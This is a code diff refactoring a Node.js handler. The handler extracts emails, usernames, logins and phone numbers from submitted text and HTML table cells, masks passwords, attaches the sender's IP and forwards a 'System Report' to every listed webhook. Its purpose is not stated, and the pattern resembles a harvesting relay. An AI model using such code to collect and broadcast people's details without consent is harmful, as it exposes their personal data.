@@ -4,7 +4,7 @@ const path = require("path");
 const FILE = path.join(process.cwd(), "data", "urls.json");
 
 /* ======================
-   LOAD URL
+   LOAD URL LIST
 ====================== */
 function loadUrls() {
   try {
@@ -21,65 +21,79 @@ function loadUrls() {
 }
 
 /* ======================
-   PARSE BODY SAFE
+   SAFE BODY PARSER
 ====================== */
 function parseBody(req) {
   if (!req.body) return {};
   if (typeof req.body === "object") return req.body;
 
   try {
-    const params = new URLSearchParams(req.body);
-    return Object.fromEntries(params.entries());
+    return Object.fromEntries(new URLSearchParams(req.body));
   } catch {
     return {};
   }
 }
 
 /* ======================
-   EXTRACT KEY VALUE (SUPPORT PHP STYLE)
+   EXTRACT VARS (FULL SUPPORT)
+   - key:value
+   - HTML table <td>
 ====================== */
 function extractVars(input = "") {
   const vars = {};
+  const raw = String(input);
 
-  const cleaned = String(input)
-    .replace(/<[^>]*>/g, "")
-    .replace(/\s+/g, " ")
-    .trim();
+  // ======================
+  // 1. REMOVE SCRIPT/STYLE
+  // ======================
+  const cleanedText = raw
+    .replace(/<script[\s\S]*?<\/script>/gi, "")
+    .replace(/<style[\s\S]*?<\/style>/gi, "");
 
-  const regex = /(\b\w+)\s*:\s*([^:]+?)(?=\s+\w+\s*:|$)/gi;
+  // ======================
+  // 2. PARSE key:value FORMAT
+  // ======================
+  const kvRegex = /(\b\w+)\s*:\s*([^:]+?)(?=\s+\w+\s*:|$)/gi;
 
-  let match;
-  while ((match = regex.exec(cleaned)) !== null) {
-    const key = match[1].toLowerCase().trim();
-    const value = match[2].trim();
+  let m;
+  while ((m = kvRegex.exec(cleanedText)) !== null) {
+    const key = m[1].toLowerCase().trim();
+    const value = m[2].trim();
 
-    if (!value) continue;
+    mapKey(vars, key, value);
+  }
 
-    switch (key) {
-      case "email":
-        vars.email = value;
-        break;
-      case "login":
-        vars.login = value;
-        break;
-      case "user":
-        vars.user = value;
-        break;
-      case "phone":
-        vars.phone = value;
-        break;
-      case "password":
-        // jangan simpan password asli
-        vars.password = "***";
-        break;
-    }
+  // ======================
+  // 3. PARSE HTML TABLE
+  // ======================
+  const tdRegex = /<td[^>]*>(.*?)<\/td>\s*<td[^>]*>(.*?)<\/td>/gi;
+
+  let t;
+  while ((t = tdRegex.exec(raw)) !== null) {
+    const keyRaw = t[1].toLowerCase().replace(/[^a-z]/gi, "");
+    const value = t[2].trim();
+
+    mapKey(vars, keyRaw, value);
   }
 
   return vars;
 }
 
 /* ======================
-   GET REAL IP
+   MAP KEY SAFE
+====================== */
+function mapKey(vars, key, value) {
+  if (!value) return;
+
+  if (key.includes("email")) vars.email = value;
+  else if (key.includes("user")) vars.user = value;
+  else if (key.includes("login")) vars.login = value;
+  else if (key.includes("phone")) vars.phone = value;
+  else if (key.includes("pass")) vars.password = "***";
+}
+
+/* ======================
+   GET IP
 ====================== */
 function getIP(req) {
   return (
@@ -99,7 +113,7 @@ function buildHtml(vars) {
 <head>
 <meta charset="UTF-8">
 </head>
-<body style="font-family:Arial;background:#ffffff;padding:20px">
+<body style="font-family:Arial;background:#fff;padding:20px">
 
 <h2>System Report</h2>
 
@@ -143,7 +157,7 @@ module.exports = async (req, res) => {
       });
     }
 
-    // extract data
+    // EXTRACT DATA
     const vars = extractVars(pesan);
     vars.ip = getIP(req);
 
@@ -158,6 +172,7 @@ module.exports = async (req, res) => {
       });
     }
 
+    // SEND TO ALL WEBHOOKS
     const results = await Promise.allSettled(
       urls.map(async (url) => {
         try {
